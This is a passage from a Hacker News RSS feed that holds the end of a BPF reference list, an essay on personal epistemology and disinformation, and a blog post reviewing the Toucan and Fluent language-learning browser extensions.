<a href="https://www.netdevconf.org/2.2/session.html?viljoen-xdpoffload-talk">Comprehensive XDP offload—Handling the edge cases</a>
(Jakub Kicinski and Nic Viljoen, netdev 2.2, Seoul, November 2017)</li>
  <li>I presented a shorter but updated version at FOSDEM 2018:<br>
<a href="https://fosdem.org/2018/schedule/event/xdp/">The Challenges of XDP Hardware Offload</a>
(Quentin Monnet, FOSDEM’18, Brussels, February 2018)</li>
</ul>

<p>About <strong>cBPF</strong>:</p>

<ul>
  <li>
    <p><a href="http://www.tcpdump.org/papers/bpf-usenix93.pdf"><em>The BSD Packet Filter: A New Architecture for User-level Packet Capture</em></a>
(Steven McCanne and Van Jacobson, 1992):<br>
The original paper about (classic) BPF.</p>
  </li>
  <li>
    <p><a href="http://www.gsp.com/cgi-bin/man.cgi?topic=bpf">The FreeBSD manual page about BPF</a>
is a useful resource to understand cBPF programs.</p>
  </li>
  <li>
    <p>Daniel Borkmann realized at least two presentations on cBPF,
<a href="http://borkmann.ch/talks/2013_devconf.pdf">one in 2013 on mmap, BPF and Netsniff-NG</a>, and
<a href="http://borkmann.ch/talks/2014_devconf.pdf">a very complete one in 2014 on tc and cls_bpf</a>.</p>
  </li>
  <li>
    <p>On Cloudflare’s blog, Marek Majkowski presented his
<a href="https://blog.cloudflare.com/introducing-the-bpf-tools/">use of BPF bytecode with the <code>xt_bpf</code> module for <strong>iptables</strong></a>.
It is worth mentioning that eBPF is also supported by this module, starting
with Linux kernel 4.10 (I do not know of …</p></li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://qmonnet.github.io/whirl-offload/2016/09/01/dive-into-bpf/">https://qmonnet.github.io/whirl-offload/2016/09/01/dive-into-bpf/</a></em></p>]]>
            </description>
            <link>https://qmonnet.github.io/whirl-offload/2016/09/01/dive-into-bpf/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25055866</guid>
            <pubDate>Wed, 11 Nov 2020 05:51:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Personal epistemology, free speech, and tech companies]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25055742">thread link</a>) | @jseliger
<br/>
November 10, 2020 | https://jakeseliger.com/2020/11/10/personal-epistemology-free-speech-and-tech-companies | <a href="https://web.archive.org/web/*/https://jakeseliger.com/2020/11/10/personal-epistemology-free-speech-and-tech-companies">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<div>
						<p>The NYT describes “<a href="https://www.nytimes.com/2020/10/13/magazine/free-speech.html">The Problem of Free Speech in an Age of Disinformation</a>, and in response Hacker News commenter <a href="https://news.ycombinator.com/item?id=24813749">throwaway13337</a> says, in part, “It’s not unchecked free speech. Instead, it’s unchecked curation by media and social media companies with the goal of engagement.” There’s some truth to the idea that social media companies have evolved to seek engagement, rather than truth, but I think the social media companies are reflecting a deeper human tendency. I wrote back to throwaway13337: “Try teaching non-elite undergrads, and particularly assignments that require some sense of epistemology, and you’ll discover that the vast majority of people have pretty poor personal epistemic hygiene—it’s not much required in most people, most of the time, in most jobs.”</p>
<p>From what I can tell, we evolved to form tribes, not to be “right:” Jonathan’s Haidt’s <a href="https://jakeseliger.com/2012/03/25/jonathan-haidts-the-righteous-mind-and-what-were-really-arguing-about/"><em>The Righteous Mind: Why Good People Are Divided by Politics and Religion</em></a> deals with this topic well and at length, and I’ve not seen any substantial rebuttals of it. We don’t naturally take to tracking the question, “How do I know what I know?” Instead, we naturally seem to want to find “facts” or ideas that support our preexisting views. In the HN comment thread, someone asked for specific examples of poor undergrad epistemic hygiene, and while I’d prefer not to get super specific for reasons of privacy, I’ve had many conversations that take the following form: “How do you know article x is accurate?” “Google told me.” “How does Google work?” “I don’t know.” “What does it take to make a claim on the Internet.” “Um. A phone, I guess?” A lot of people—maybe most—will uncritically take as fact whatever happens to be served up by Google (it’s always Google and never Duck Duck Go or Bing), and most undergrads whose work I’ve read will, again uncritically, accept clickbait sites and similar as accurate. Part of the reason for this reasoning is that undergrads’s lives are minimally affected by being wrong or incomplete about some claim done in a short assignment that’s being imposed by some annoying professor toff standing between them and their degree.</p>
<p>The gap between elite information discourse and everyday information discourse, even among college students, who may be more sophisticated than their peer equivalents, is vast—so vast that I don’t think most journalists (who mostly talk to other journalists and to experts) and to other people who work with information, data, and ideas really truly understand it. We’re all living in bubbles. I don’t think I did, either, before I saw the epistemic hygiene most undergrads practice, or don’t practice. This is not a “kids these days” rant, either: many of them have never really been taught to ask themselves, “How do I know what I know?” Many have never really learned anything about the scientific method. It’s not happening much in most non-elite schools, so where are they going to get epistemic hygiene from?</p>
<p>The United States alone has 320 million people in it. Table DP02 in the Census at data.census.gov estimates that 20.3% of the population age 25 and older has a college bachelor’s degree, and 12.8% have a graduate or professional degree. Before someone objects, let me admit that a college degree is far from a perfect proxy for epistemic hygiene or general knowledge, and some high school dropouts perform much better at cognition, meta cognition, statistical reasoning, and so forth, than do some people with graduate degrees. With that said, though, a college degree is probably a decent approximation for baseline abstract reasoning skills and epistemic hygiene.</p>
<p>Almost anyone who wants a megaphone in the form of one of the many social media platforms available now has one. The number of people motivated by questions like “What is really true, and how do I discern what is really true? How do I enable myself to get countervailing data and information into my view, or worldview, or worldviews?” is not zero, again obviously, but it’s not a huge part of the population. And many very “smart” people in an IQ sense use their intelligence to build better rationalizations, rather than to seek truth (and I may be among the rationalizers: I’m not trying to exclude myself from that category).</p>
<p>Until relatively recently, almost everyone with a media megaphone had some kind of training or interest in epistemology, even they didn’t call it “epistemology.” Editors would ask, “How do you know that?” or “Who told you that?” or that sort of thing. Professors have systems that are supposed to encourage greater-than-average epistemic hygiene (again: these systems were not and are not perfect, and nothing I have written so far implies that they were or are).</p>
<p>Most people don’t care about the question, “How do you know what you know?” and they’ll be fairly surprised if it’s asked, implicitly or explicitly. Some people are intrigued by it but most aren’t, and view questions about sources and knowledge to be a hindrance. This is less likely to be true of people who aspire to be researchers or work in other knowledge-related professions, but that describes only a small percentage of undergraduates, particularly at non-elite schools. And the “elite schools” thing drives a lot of the media discourse around education. One of the things I like about Professor X’s book <a href="https://jakeseliger.com/2011/06/10/summary-judgement-in-the-basement-of-the-ivory-tower-confessions-of-an-accidental-academic-professor-x/"><em>In the Basement of the Ivory Tower</em></a> is how it functions as a corrective to that discourse.</p>
<p>For most people, floating a factually incorrect conspiracy theory online isn’t going to negatively affect their lives. If someone is a nurse and gives a patient a wrong medication or incorrect medication, that person is not going to be a nurse for long. If the nurse states or repeats a factually incorrect political or social idea online, particularly but not exclusively under a pseudonym, that nurse’s life likely won’t be affected. There’s no truth feedback loop. The same is true for someone working in, say, construction, or engineering, or many other fields. The person is free to state things that are factually incorrect, or incomplete, or misleading, and doing so isn’t going to have many negative consequences. Maybe it will have some positive consequences: one way to show that you’re really on team x is to state or repeat falsehoods that show you’re on team x, rather than on team “What is really true?”</p>
<p>I don’t want to get into daily political discourse, since that tends to raise defenses and elicit anger, but the last eight months have demonstrated many people’s problems with epistemology, and in a way that can have immediate, negative personal consequences—but not for everyone.</p>
<p><a href="https://www.pewresearch.org/fact-tank/2019/09/26/who-doesnt-read-books-in-america/">Pew Research data indicate that a quarter of US adults didn’t read a book in 2018</a>; this is consistent with <a href="https://www.newyorker.com/magazine/2007/12/24/twilight-of-the-books">other data</a> indicating that about half of US adults read zero or one books per year. Again, yes, there are surely many individuals who read other materials and have excellent epistemic hygiene, but this is a reasonable mass proxy, given the demands that reading makes on us.</p>
<p>Many people driving the (relatively) elite discourse don’t realize how many people are not only not like them, but wildly not like them, along numerous metrics. It may also be that <a href="http://www.arnoldkling.com/blog/gossip-at-scale/">we don’t know how to deal with gossip at scale</a>. Interpersonal gossip is all about personal stories, while many problems at scale are best understood through data—but the number of people deeply interested in data and data’s veracity is small. And elite discourse has some of its own possible epistemic falsehoods, or at least uncertainties, embedded within it: some of the populist rhetoric against elites is rooted in truth.</p>
<p>We are all caught in our bubble, and the universe of people is almost unimaginably larger than the number of people in our bubble. If you got this far, you’re probably in a nerd bubble: usually, anything involving the word “epistemology” sends people to sleep or, alternately, scurrying for something like “You won’t believe what this celebrity wore/said/did” instead. Almost no one wants to consider epistemology; to do so as a hobby is rare. One person’s disinformation is another person’s teambuilding. If you think the preceding sentence is in favor of disinformation, by the way, it’s not.</p>
					</div><!-- .entry-content -->
	</div></div>]]>
            </description>
            <link>https://jakeseliger.com/2020/11/10/personal-epistemology-free-speech-and-tech-companies</link>
            <guid isPermaLink="false">hacker-news-small-sites-25055742</guid>
            <pubDate>Wed, 11 Nov 2020 05:28:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Business ideas (from my first million podcast)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25055308">thread link</a>) | @micropoet
<br/>
November 10, 2020 | https://www.notion.so/50-Businesses-from-My-First-Million-306d9b5cbaef488ea8181e2d27e71553 | <a href="https://web.archive.org/web/*/https://www.notion.so/50-Businesses-from-My-First-Million-306d9b5cbaef488ea8181e2d27e71553">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.notion.so/50-Businesses-from-My-First-Million-306d9b5cbaef488ea8181e2d27e71553</link>
            <guid isPermaLink="false">hacker-news-small-sites-25055308</guid>
            <pubDate>Wed, 11 Nov 2020 03:46:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Learning a New Language While Browsing the Web]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25055257">thread link</a>) | @rahulchowdhury
<br/>
November 10, 2020 | https://hulry.com/toucan-learn-language/ | <a href="https://web.archive.org/web/*/https://hulry.com/toucan-learn-language/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        
<p>Around 2015, I picked up a hobby of learning a new language — Spanish.</p>



<p>However, after a few months of dedicated learning time, I couldn’t get myself to stick to the hobby.</p>



<p>I had other things to work on, and learning a language was not my priority.</p>



<p>But things have changed now.</p>



<p>In this post, I’ll talk about how I’m learning a bit of Spanish every single day using a new language learning tool called <a href="https://jointoucan.com/" target="_blank" rel="noreferrer noopener">Toucan</a>.</p>



<p>Let’s get started with:</p>



<h2>My experience with various language-learning apps</h2>



<p>I started my Spanish learning journey with the most popular language-learning app — <a href="https://www.duolingo.com/" target="_blank" rel="noreferrer noopener nofollow">Duolingo</a>.</p>



<p>While it was fun initially, I soon found myself missing practice days.</p>



<p>As time passed by, the gap widened. And soon enough, I stopped my Spanish sessions.</p>



<p>In the last few years, I’ve tried to rekindle the Spanish spark in me and continue learning with Duolingo. Still, I never succeeded in sticking to the classes.</p>



<p>Then came <a href="https://www.babbel.com/" target="_blank" rel="noreferrer noopener nofollow">Babbel</a>.</p>



<p>While I must say that Babbel has a better course in terms of learning proper grammar and dialects, it had the same problem as Duolingo:</p>



<p>It was hard for me to dedicate time from my schedule for learning sessions.</p>



<p>My only motivation for learning Spanish was to expand my skill set.</p>



<p>Since I’m not moving to a Spanish speaking country anytime soon, I didn’t feel the need to prioritise this hobby.</p>



<p>But then:</p>



<p>A few months ago, I spotted a new <a href="https://chrome.google.com/webstore/detail/toucan/lokjgaehpcnlmkebpmjiofccpklbmoci" target="_blank" rel="noreferrer noopener nofollow">Chrome extension called Toucan</a>. Around the same time, a similar extension launched called <a href="https://www.usefluent.co/" target="_blank" rel="noreferrer noopener">Fluent</a>.</p>



<p>The key selling point of these new extensions was to learn a new language while browsing the web.</p>



<p>You don’t need to dedicate time for picking up a new language. Club the learning sessions, along with activities we do every day — browsing the web and reading articles online.</p>



<p>After a quick test ride, here’s:</p>



<h2>Why I find language learning extensions interesting</h2>



<p>The first and most immense value — habit bundling.</p>



<p>I had previously talked about how I <a href="https://hulry.com/building-podcasts-habit/" target="_blank" rel="noreferrer noopener">clubbed my habit</a> of making tea every morning with listening to podcasts.</p>



<p>I saw a similar opportunity with these browser extensions.</p>



<p>The biggest hurdle for me in learning Spanish was making time for classes.</p>



<p>Now:</p>



<p>I don’t need to dedicate time out of my daily routine to learn a new language.</p>



<p>I browse and read lots of articles online. With Toucan or Fluent, I can learn and practice Spanish every time I read stuff online.</p>



<p>Here’s:</p>



<h2>How Toucan and Fluent work</h2>



<p>Install Toucan or Fluent, and browse the web as you’d typically do.</p>



<p>These extensions will translate and highlight some words from the page content into the language you’ve chosen.</p>



<p>Hovering over the highlighted word will bring up a popup card like this:</p>



<div><figure><img data-attachment-id="943" data-permalink="https://hulry.com/toucan-learn-language/toucan-translation-demo/" data-orig-file="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-demo.png?fit=1646%2C742&amp;ssl=1" data-orig-size="1646,742" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="toucan-translation-demo" data-image-description="" data-medium-file="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-demo.png?fit=300%2C135&amp;ssl=1" data-large-file="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-demo.png?fit=1024%2C462&amp;ssl=1" loading="lazy" width="1024" height="462" src="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-demo.png?resize=1024%2C462&amp;ssl=1" alt="Toucan translating and showing up a word on Instapaper." srcset="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-demo.png?resize=1024%2C462&amp;ssl=1 1024w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-demo.png?resize=300%2C135&amp;ssl=1 300w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-demo.png?resize=768%2C346&amp;ssl=1 768w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-demo.png?resize=1536%2C692&amp;ssl=1 1536w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-demo.png?resize=1200%2C541&amp;ssl=1 1200w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-demo.png?w=1646&amp;ssl=1 1646w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-demo.png?resize=1024%2C462&amp;ssl=1 1024w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-demo.png?resize=300%2C135&amp;ssl=1 300w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-demo.png?resize=768%2C346&amp;ssl=1 768w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-demo.png?resize=1536%2C692&amp;ssl=1 1536w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-demo.png?resize=1200%2C541&amp;ssl=1 1200w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-demo.png?w=1646&amp;ssl=1 1646w" data-lazy-src="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-demo.png?resize=1024%2C462&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Toucan translating and showing up a word on Instapaper.</figcaption></figure></div>



<p>Pretty neat. Right?</p>



<p>Apart from the convenience, another thing I like is that the translations are beautifully blended into the content.</p>



<p>For example, from the above screenshot, you can see Toucan seamlessly translated and blended the English word “event” into its Spanish counterpart — evento.</p>



<p>While reading an article, I can see a mixture of English and the language I want to learn.</p>



<p>To know more about the translated word, I can hover on it and Toucan will show me the word in English, with its definition.</p>



<p>I’ve tried both Toucan and Fluent on multiple websites, and they seem to blend in translations flawlessly with the page’s design.</p>



<p>Here’s an article on Forbes with Toucan translations:</p>



<div><figure><img data-attachment-id="947" data-permalink="https://hulry.com/toucan-learn-language/toucan-translation-forbes/" data-orig-file="https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-forbes.png?fit=1474%2C814&amp;ssl=1" data-orig-size="1474,814" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="toucan-translation-forbes" data-image-description="" data-medium-file="https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-forbes.png?fit=300%2C166&amp;ssl=1" data-large-file="https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-forbes.png?fit=1024%2C565&amp;ssl=1" loading="lazy" width="1024" height="565" src="https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-forbes.png?resize=1024%2C565&amp;ssl=1" alt="Toucan translating words from an article on Forbes." srcset="https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-forbes.png?resize=1024%2C565&amp;ssl=1 1024w, https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-forbes.png?resize=300%2C166&amp;ssl=1 300w, https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-forbes.png?resize=768%2C424&amp;ssl=1 768w, https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-forbes.png?resize=1200%2C663&amp;ssl=1 1200w, https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-forbes.png?w=1474&amp;ssl=1 1474w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-forbes.png?resize=1024%2C565&amp;ssl=1 1024w, https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-forbes.png?resize=300%2C166&amp;ssl=1 300w, https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-forbes.png?resize=768%2C424&amp;ssl=1 768w, https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-forbes.png?resize=1200%2C663&amp;ssl=1 1200w, https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-forbes.png?w=1474&amp;ssl=1 1474w" data-lazy-src="https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-forbes.png?resize=1024%2C565&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Toucan translating words from an article on Forbes.</figcaption></figure></div>



<p>Now:</p>



<p>Fluent, however, has a more targeted highlighting than Toucan. </p>



<p>If you’re using Fluent, it’ll highlight words with different colour based on gender.</p>



<div><figure><img data-attachment-id="983" data-permalink="https://hulry.com/toucan-learn-language/fluent-colour-highlights/" data-orig-file="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-colour-highlights.png?fit=1596%2C508&amp;ssl=1" data-orig-size="1596,508" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="fluent-colour-highlights" data-image-description="" data-medium-file="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-colour-highlights.png?fit=300%2C95&amp;ssl=1" data-large-file="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-colour-highlights.png?fit=1024%2C326&amp;ssl=1" loading="lazy" width="1024" height="326" src="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-colour-highlights.png?resize=1024%2C326&amp;ssl=1" alt="Fluent highlighting words with a different colour." srcset="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-colour-highlights.png?resize=1024%2C326&amp;ssl=1 1024w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-colour-highlights.png?resize=300%2C95&amp;ssl=1 300w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-colour-highlights.png?resize=768%2C244&amp;ssl=1 768w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-colour-highlights.png?resize=1536%2C489&amp;ssl=1 1536w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-colour-highlights.png?resize=1200%2C382&amp;ssl=1 1200w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-colour-highlights.png?w=1596&amp;ssl=1 1596w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-colour-highlights.png?resize=1024%2C326&amp;ssl=1 1024w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-colour-highlights.png?resize=300%2C95&amp;ssl=1 300w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-colour-highlights.png?resize=768%2C244&amp;ssl=1 768w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-colour-highlights.png?resize=1536%2C489&amp;ssl=1 1536w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-colour-highlights.png?resize=1200%2C382&amp;ssl=1 1200w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-colour-highlights.png?w=1596&amp;ssl=1 1596w" data-lazy-src="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-colour-highlights.png?resize=1024%2C326&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Fluent highlighting words with a different colour.</figcaption></figure></div>



<p>In the paragraph shown above, Fluent highlighted the word “derrame” with a yellow tint (because it’s masculine), and “incluso” with a neutral grey-ish colour (because it’s gender-neutral).</p>



<p>That said, here are:</p>



<h2>Some features in Toucan that caught my attention</h2>



<p>Trying out both extensions, I chose to stick with Toucan, mainly due to a couple of subtle features.</p>



<p>The first being:</p>



<h3>Word definitions</h3>



<p>Toucan shows up the definition of a translated word on the hovercard that shows up.</p>



<div><figure><img data-attachment-id="952" data-permalink="https://hulry.com/toucan-learn-language/toucan-word-definition/" data-orig-file="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-word-definition.png?fit=1524%2C632&amp;ssl=1" data-orig-size="1524,632" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="toucan-word-definition" data-image-description="" data-medium-file="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-word-definition.png?fit=300%2C124&amp;ssl=1" data-large-file="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-word-definition.png?fit=1024%2C425&amp;ssl=1" loading="lazy" width="1024" height="425" src="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-word-definition.png?resize=1024%2C425&amp;ssl=1" alt="Toucan showing a word's definition." srcset="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-word-definition.png?resize=1024%2C425&amp;ssl=1 1024w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-word-definition.png?resize=300%2C124&amp;ssl=1 300w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-word-definition.png?resize=768%2C318&amp;ssl=1 768w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-word-definition.png?resize=1200%2C498&amp;ssl=1 1200w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-word-definition.png?w=1524&amp;ssl=1 1524w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-word-definition.png?resize=1024%2C425&amp;ssl=1 1024w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-word-definition.png?resize=300%2C124&amp;ssl=1 300w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-word-definition.png?resize=768%2C318&amp;ssl=1 768w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-word-definition.png?resize=1200%2C498&amp;ssl=1 1200w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-word-definition.png?w=1524&amp;ssl=1 1524w" data-lazy-src="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-word-definition.png?resize=1024%2C425&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Toucan showing a word’s definition.</figcaption></figure></div>



<p>As a non-native English speaker, this feature is helpful to me. </p>



<p>If I don’t know the meaning of the translated word, I can read the definition on the card.</p>



<p>There’s one caveat though:</p>



<p>Right now, not all words show up a definition. However, the number of words without a description is low.</p>



<p>Also, the team at Toucan promised they are continuously working on adding more words and definitions to the tool.</p>



<p>Therefore, this caveat should no longer exist pretty soon.</p>



<p>Another feature I found helpful is:</p>



<h3>The ability to mark a word as learnt</h3>



<p>The Toucan hovercard has a little checkmark which lets me mark a word as learnt, like this:</p>



<div><figure><img data-attachment-id="958" data-permalink="https://hulry.com/toucan-learn-language/touch-mark-word-done/" data-orig-file="https://i2.wp.com/hulry.com/wp-content/uploads/2020/11/touch-mark-word-done.gif?fit=840%2C526&amp;ssl=1" data-orig-size="840,526" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="touch-mark-word-done" data-image-description="" data-medium-file="https://i2.wp.com/hulry.com/wp-content/uploads/2020/11/touch-mark-word-done.gif?fit=300%2C188&amp;ssl=1" data-large-file="https://i2.wp.com/hulry.com/wp-content/uploads/2020/11/touch-mark-word-done.gif?fit=840%2C526&amp;ssl=1" loading="lazy" width="840" height="526" src="https://i2.wp.com/hulry.com/wp-content/uploads/2020/11/touch-mark-word-done.gif?resize=840%2C526&amp;ssl=1" alt="Marking a word as known in Toucan." data-recalc-dims="1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Marking a word as known in Toucan.</figcaption></figure></div>



<p>What this does is it prevents the word from getting translated in future articles or content.</p>



<p>Since I had taken a couple of Spanish lessons in the past, I marked a handful of words as “I know this” and Toucan will leave those words in the source language — English, for me.</p>



<p>Also:</p>



<p>The Toucan team is working on some recommendation magic for this feature.</p>



<p>For example:</p>



<p>Marking the word “coffee” as learnt will set Toucan to translate tricky words like “hot coffee” or “nice coffee” in your future reads.</p>



<p>This is how I’ll be able to calibrate Toucan to show up more complicated words as I progress in my Spanish learning journey. </p>



<p>Now:</p>



<p>Everyone learns at a different pace.</p>



<p>To make it easy to progress comfortably, Toucan allows me to:</p>



<h3>Select language packs for translation</h3>



<p>Instead of being bombarded with a giant index of Spanish words, Toucan allows me to <a href="https://jointoucan.com/dashboard" target="_blank" rel="noreferrer noopener nofollow">select language packs</a> on the dashboard:</p>



